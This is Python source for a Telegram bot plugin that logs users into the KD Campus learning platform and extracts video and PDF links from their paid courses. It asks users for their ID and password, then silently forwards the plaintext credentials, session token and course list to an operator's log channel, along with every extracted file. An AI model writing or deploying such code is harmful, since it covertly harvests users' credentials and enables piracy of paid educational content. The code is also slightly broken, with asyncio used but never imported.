from Extractor import app
from pyrogram import filters
import json
import time
import httpx
import hashlib
from config import PREMIUM_LOGS
log_channel = PREMIUM_LOGS


@app.on_message(filters.command(["kd"]))
async def kdlive(app, m):
    try:
        appname = 'KD Live'
        await extract(app, m, appname)
    except Exception as e:
        await m.reply(str(e))
    
async def extract(app, m, appname):
    async with httpx.AsyncClient() as s:
        ask_cred = 'Send id password of <b>KD CAMPUS</b> in given format or just send token.\n\n<b>Format:-</b> ID*Password'
        a = await m.reply(ask_cred.format(appname))
        try:
            tokenn = id_password = (await app.listen(m.chat.id, timeout=120)).text
        except asyncio.TimeoutError:
            return await app.send_message(m.chat.id, "Timeout: No response received. Try Again...")
        
        if '*' in id_password:
            mob, pwd = id_password.split('*', 1)
            password = hashlib.sha512(pwd.encode()).hexdigest()
            payload = {
                "code": "",
                "valid_id": "",
                "api_key": "kdc123",
                "mobilenumber": mob,
                "password": password
            }

            headers = {"User-Agent":"okhttp/4.10.0","Accept-Encoding":"gzip","Content-Type":"application/json","content-type":"application/json; charset=UTF-8"}
            resp = (await s.post("https://web.kdcampus.live/android/Usersn/login_user", data=json.dumps(payload), headers=headers)).json()['data']
            tokenn = resp['id'] + ':' + resp['connection_key']
            
        userid, token = tokenn.split(':')
        
        resp = (await s.get(f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/{userid}/4')).json()
        batch_list = bid_list = ''
        batch_liisst = []
        for item in resp:
            id, ccid, name, price, cimage = item['course_id'], item['batch_id'], item['batch_name'], None, "http://kdcampus.live/uploaded/landing_images/" + item['banner_image_name']
            batch_list += f'<code>{ccid}_{id}</code> - {name} ✳️ {price}\n\n'
            bid_list += f'{ccid}_{id},'
            batch_liisst.append({'id': str(id), 'ccid': str(ccid), 'name': name, 'price': price, 'image': cimage})
            
        batch_list += f'<code>{bid_list[:-1]}</code>\n\n'
        
        await app.send_message(log_channel, f"LOGIN SUCESS FOR KD \n ID*PASSWORD - `{id_password}`\n Token = {token}\n {batch_list}")
        biid = await m.reply_text(f"{batch_list}")
        au = await app.ask(m.chat.id, "NOW SEND COURSE ID TO DOWNLOAD")
        bid = au.text
        if not bid: return
        for bid in bid.split(','):
            if bid not in bid_list:
                continue
            try:
                rv = []
                bid, ccid = bid.split('_')
                id, name, price, t_link = next(((item['id'], item['name'], item['price'], item['image']) for item in batch_liisst if bid == item['ccid']), (None, None, None, None))
                ctitle = f'{bid} {name} ₹{price}'
                tmp = await m.reply(f'<b>Extracting from :</b> {ctitle}')
                resp = (await s.get(f"https://web.kdcampus.live/android/Dashboard/course_subject/{token}/{userid}/{ccid}/{bid}")).json()['subjects']
                for item in resp:
                    sid, sub_title = item['id'], item['subject_name']
                    vidResp = (await s.get(f"https://web.kdcampus.live/android/Dashboard/course_details_video/{token}/{userid}/{ccid}/{bid}/0/{sid}/0")).json()
                    for item in reversed(vidResp):
                        title, link = item['content_title'], "https://" + item['jwplayer_id']
                        rv.append(f"({sub_title}){title}:{link}")
                    notesResp = (await s.get(f"https://web.kdcampus.live/android/Dashboard/course_details_pdf/{token}/{userid}/{ccid}/{bid}/0/{sid}/0")).json()
                    for item in reversed(notesResp):
                        title, link = item['content_title'], "https://kdcampus.live/uploaded/content_data/" + item['file_name']
                        rv.append(f"({sub_title}){title}:{link}")
                

                txtn = f"{ctitle}"
                filename = f"{txtn.replace(':', '_').replace('/', '_')}.txt"
                c_text = f"<b>**App Name :** KD CAPMUS</b>\n Batch Name : {ctitle} \n\n  **╾───• JAAT EXTRACTOR •───╼** "
                with open(filename, 'w') as f:
                    f.write('\n'.join(rv)) 
                await app.send_document(m.chat.id, filename, caption = c_text)
                await app.send_document(log_channel, filename , caption = c_text)
                await tmp.delete(True)
            except Exception as e:
                await m.reply(f'Error: {e}')
        
